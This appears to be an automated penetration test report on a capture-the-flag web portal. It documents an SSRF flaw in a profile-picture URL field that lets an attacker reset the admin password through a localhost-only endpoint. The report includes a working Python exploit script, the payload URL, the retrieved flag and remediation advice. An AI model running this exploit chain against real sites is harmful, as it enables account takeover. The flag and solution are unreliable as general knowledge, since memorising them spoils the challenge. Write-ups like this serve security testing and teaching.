# Security Penetration Test Report

**Generated:** 2025-12-10 00:54:52 UTC

# Synthwave User Portal Security Assessment Report

## Executive Summary
A critical security assessment was conducted on the Synthwave User Portal. The assessment identified a Critical severity Server-Side Request Forgery (SSRF) vulnerability that allowed for complete account takeover of the administrator account. By exploiting this vulnerability, we were able to access a restricted, localhost-only endpoint to reset the administrator's password, bypass authentication, and access sensitive information including the capture the flag (CTF) flag.

## Key Findings

### 1. Critical: SSRF Leading to Admin Account Takeover
- **Vulnerability:** Server-Side Request Forgery (SSRF)
- **Location:** `/profile` endpoint, `profile_picture_url` parameter
- **Impact:** Complete system compromise via Admin Account Takeover
- **Description:** The application allows users to update their profile picture via a URL (`profile_picture_url`). The application fetches this URL from the server side without adequate validation or restriction of internal IP addresses.
- **Exploit Chain:**
    1.  An attacker registers a standard user account.
    2.  The attacker navigates to the `/profile` page.
    3.  The attacker submits a POST request to update the profile with `profile_picture_url` set to `http://127.0.0.1:80/reset_password?username=admin&newpassword=hacked`.
    4.  The server processes this request, making a local GET request to the `/reset_password` endpoint.
    5.  The `/reset_password` endpoint is documented as "Only accessible from localhost", but the SSRF request originates from the server itself (localhost), bypassing this restriction.
    6.  The administrator's password is successfully changed to the attacker's chosen password.
    7.  The attacker logs in as `admin` and gains full administrative access.

### 2. Information Disclosure
- **Vulnerability:** Source Code Comments Disclosure
- **Location:** HTML Source Code
- **Impact:** Low (Facilitates exploitation)
- **Description:** The HTML source code contains detailed comments documenting all API endpoints, including the restricted `/reset_password` endpoint and its parameters. This information significantly aided in constructing the exploit.

## Proof of Concept
The following Python script demonstrates the exploitation:

```python
import requests

# Target URL
BASE_URL = "http://host.docker.internal:10024" # Mapped to container
INTERNAL_PORT = 80 # Discovered internal port

# 1. Register Attacker Account
session = requests.Session()
session.post(f"{BASE_URL}/register", data={
    "username": "attacker",
    "password": "password",
    "first_name": "Attacker",
    "last_name": "User",
    "email": "attacker@example.com"
})

# 2. Exploit SSRF to Reset Admin Password
# Target the internal /reset_password endpoint via localhost
exploit_url = f"http://127.0.0.1:{INTERNAL_PORT}/reset_password?username=admin&newpassword=pwned123"

session.post(f"{BASE_URL}/profile", data={
    "first_name": "Attacker",
    "last_name": "User",
    "email": "attacker@example.com",
    "profile_picture_url": exploit_url
})

# 3. Login as Admin
response = session.post(f"{BASE_URL}/login", data={
    "username": "admin",
    "password": "pwned123"
})

if "Welcome, admin" in response.text or "Logout" in response.text:
    print("Admin Account Takeover Successful!")
```

## Flag
The flag retrieved from the administrator's profile page is:
`FLAG{6405c2f787acd0c63e0812b1f377e35d55753310c8c30c98183ed63ec23a5e2d}`

## Recommendations
1.  **Restrict SSRF:** Implement strict allowlisting for the `profile_picture_url` parameter. Ensure that the application cannot make requests to private IP ranges (e.g., `127.0.0.1`, `10.x.x.x`, `192.168.x.x`) or metadata services.
2.  **Network Segmentation:** Isolate the application server from internal management endpoints if possible, or ensure internal endpoints are bound to interfaces not accessible even by the application itself if not intended.
3.  **Authentication for Critical Actions:** The `/reset_password` endpoint should require strong authentication and authorization, even if accessed locally. Relying solely on network position (localhost) is insufficient.
4.  **Remove Sensitive Comments:** Remove development comments from production HTML code that disclose internal API structure.
